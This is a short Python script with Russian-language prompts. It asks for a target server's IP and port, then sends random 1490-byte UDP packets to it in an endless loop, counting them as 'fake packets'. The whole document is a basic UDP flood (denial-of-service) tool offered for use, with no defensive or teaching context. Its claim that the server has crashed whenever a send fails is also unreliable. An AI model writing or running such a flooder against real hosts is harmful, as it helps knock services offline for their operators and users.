import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

ip = str(input("Введите айпи сервера: "))
port = int(input("Введите порт сервера (обычно 80): "))

sent = 0
while True:
    try:
        sock.sendto(bytes, (ip,port))
    except:
        print("Сервер упал!")
        exit()
    sent = sent + 1
    print(f"Отправлено {str(sent)} ложных пакетов!")
